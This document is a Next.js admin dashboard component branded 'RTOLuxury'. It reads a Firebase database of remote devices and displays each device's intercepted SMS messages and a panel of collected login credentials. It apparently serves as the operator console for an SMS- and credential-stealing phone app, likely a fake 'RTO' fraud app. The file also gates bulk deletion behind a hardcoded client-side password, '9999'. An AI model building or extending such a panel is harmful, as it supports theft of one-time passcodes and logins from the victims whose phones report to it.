"use client";
import React, { useState, useEffect } from "react";
import { ref, onValue, remove } from "firebase/database";
import { db } from "../lib/firebase";
import DevicesPanel from "../components/DevicesPanel";
import FavouritesPanel from "../components/FavouritesPanel";
import SmsPanel from "../components/SmsPanel";
import CredentialsPanel from "../components/CredentialsPanel";
import BackupPanel from "../components/BackupPanel";
import AnalyticsPanel from "../components/AnalyticsPanel";

export default function AdminDashboard() {
  const [data, setData] = useState({ user_data: {}, user_sms: {}, login: {}, backup_sms: {} });
  const [activePanel, setActivePanel] = useState("devices");
  const [favourites, setFavourites] = useState([]);
  const [deviceOnlineStatus, setDeviceOnlineStatus] = useState({});
  const [deviceSerialMap, setDeviceSerialMap] = useState({});
  const [smsModalDevice, setSmsModalDevice] = useState(null);
  const [toasts, setToasts] = useState([]);

  const showToast = (message, type = "info") => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 3000);
  };

  useEffect(() => {
    try {
      const saved = localStorage.getItem("rtoFavourites");
      if (saved) setFavourites(JSON.parse(saved));
    } catch (e) {}
  }, []);

  const toggleFavourite = (devId) => {
    let next;
    if (favourites.includes(devId)) {
      next = favourites.filter(id => id !== devId);
      showToast(`Removed ${devId} from favourites`, "info");
    } else {
      next = [...favourites, devId];
      showToast(`Added ${devId} to favourites`, "success");
    }
    setFavourites(next);
    localStorage.setItem("rtoFavourites", JSON.stringify(next));
  };

  useEffect(() => {
    const rootRef = ref(db);
    const unsubscribe = onValue(rootRef, (snapshot) => {
      const val = snapshot.val() || {};
      setData(val);

      const devs = val.user_data || {};
      const onlineMap = {};
      const serialMap = {};
      const now = Date.now();

      Object.keys(devs).forEach(id => {
        const d = devs[id];
        const lastSeen = d.last_online || d.timestamp || 0;
        onlineMap[id] = (d.isOnline || d.online) || (now - lastSeen < 120000);

        let serial = d.user_serial || d.uesr_serial || 0;
        if (typeof serial === "string") serial = parseInt(serial) || 0;
        serialMap[id] = serial;
      });

      setDeviceOnlineStatus(onlineMap);
      setDeviceSerialMap(serialMap);
    });

    return () => unsubscribe();
  }, []);

  const deleteAllSms = () => {
    const pwd = prompt("🔐 Enter Password to Delete ALL SMS:");
    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
    if (!confirm("Are you sure you want to delete ALL SMS?")) return;
    remove(ref(db, "user_sms")).then(() => showToast("✅ All SMS Deleted", "success"));
  };

  const deleteAllCredentials = () => {
    const pwd = prompt("🔐 Enter Password to Delete ALL Credentials:");
    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
    if (!confirm("Delete ALL credentials?")) return;
    remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
  };

  return (
    <div className="app-wrapper">
      <header className="top-bar">
        <div className="brand">
          <span className="brand-icon">✦</span>
          <span className="brand-name">RTO<em>Luxury</em></span>
          <span className="brand-badge">Next.js v3.0</span>
        </div>
        <div className="top-right">
          <div className="connection-status online">
            <span className="dot"></span>
            <span>Realtime Cloud</span>
          </div>
          <div className="profile-avatar"><i className="fas fa-user-cog"></i></div>
        </div>
      </header>

      <div className="main-layout">
        <aside className="sidebar">
          <nav className="sidebar-nav">
            <button className={`nav-item ${activePanel === "devices" ? "active" : ""}`} onClick={() => setActivePanel("devices")}>
              <i className="fas fa-mobile-alt"></i>
              <span>Devices</span>
              <span className="nav-badge">{Object.keys(data.user_data || {}).length}</span>
            </button>
            <button className={`nav-item ${activePanel === "favourites" ? "active" : ""}`} onClick={() => setActivePanel("favourites")}>
              <i className="fas fa-star" style={{ color: "var(--gold)" }}></i>
              <span>Favourites</span>
              <span className="nav-badge">{favourites.length}</span>
            </button>
            <button className={`nav-item ${activePanel === "sms" ? "active" : ""}`} onClick={() => setActivePanel("sms")}>
              <i className="fas fa-envelope"></i>
              <span>Messages</span>
            </button>
            <button className={`nav-item ${activePanel === "credentials" ? "active" : ""}`} onClick={() => setActivePanel("credentials")}>
              <i className="fas fa-key"></i>
              <span>Credentials</span>
              <span className="nav-badge">{Object.keys(data.login || {}).length}</span>
            </button>
            <button className={`nav-item ${activePanel === "backup" ? "active" : ""}`} onClick={() => setActivePanel("backup")}>
              <i className="fas fa-database"></i>
              <span>Backup</span>
            </button>
            <button className={`nav-item ${activePanel === "analytics" ? "active" : ""}`} onClick={() => setActivePanel("analytics")}>
              <i className="fas fa-chart-pie"></i>
              <span>Analytics</span>
            </button>
          </nav>
        </aside>

        <main className="content-area">
          {activePanel === "devices" && (
            <DevicesPanel 
              data={data} 
              deviceOnlineStatus={deviceOnlineStatus}
              deviceSerialMap={deviceSerialMap}
              favourites={favourites}
              toggleFavourite={toggleFavourite}
              showToast={showToast}
              openSmsModal={(id) => setSmsModalDevice(id)}
              deleteAllSms={deleteAllSms}
              deleteAllCredentials={deleteAllCredentials}
            />
          )}
          {activePanel === "favourites" && (
            <FavouritesPanel 
              data={data} 
              deviceSerialMap={deviceSerialMap} 
              favourites={favourites} 
              toggleFavourite={toggleFavourite} 
              showToast={showToast} 
            />
          )}
          {activePanel === "sms" && (
            <SmsPanel 
              data={data} 
              deleteAllSms={deleteAllSms} 
              showToast={showToast} 
            />
          )}
          {activePanel === "credentials" && (
            <CredentialsPanel 
              data={data}
              deviceSerialMap={deviceSerialMap}
              showToast={showToast}
              deleteAllCredentials={deleteAllCredentials}
            />
          )}
          {activePanel === "backup" && (
            <BackupPanel 
              data={data} 
              showToast={showToast} 
            />
          )}
          {activePanel === "analytics" && (
            <AnalyticsPanel 
              data={data} 
            />
          )}
        </main>
      </div>

      {smsModalDevice && (
        <div className="modal-luxury open" onClick={() => setSmsModalDevice(null)}>
          <div className="modal-luxury-content" onClick={e => e.stopPropagation()}>
            <div className="modal-luxury-header">
              <h3>📩 Messages for {smsModalDevice}</h3>
              <button className="modal-luxury-close" onClick={() => setSmsModalDevice(null)}>✕</button>
            </div>
            <div className="modal-luxury-body">
              {Object.values(data.user_sms?.[smsModalDevice] || {}).reverse().map((msg, idx) => (
                <div key={idx} className="sms-card-luxury" style={{ marginBottom: 8 }}>
                  <div className="sms-header">
                    <span className="sms-sender">👤 {msg.sender || msg.address}</span>
                    <span className="sms-meta">{msg.date}</span>
                  </div>
                  <div className="sms-body">{msg.body}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      <div id="toastContainer">
        {toasts.map(t => (
          <div key={t.id} className={`toast-luxury ${t.type}`}>{t.message}</div>
        ))}
      </div>
    </div>
  );
}
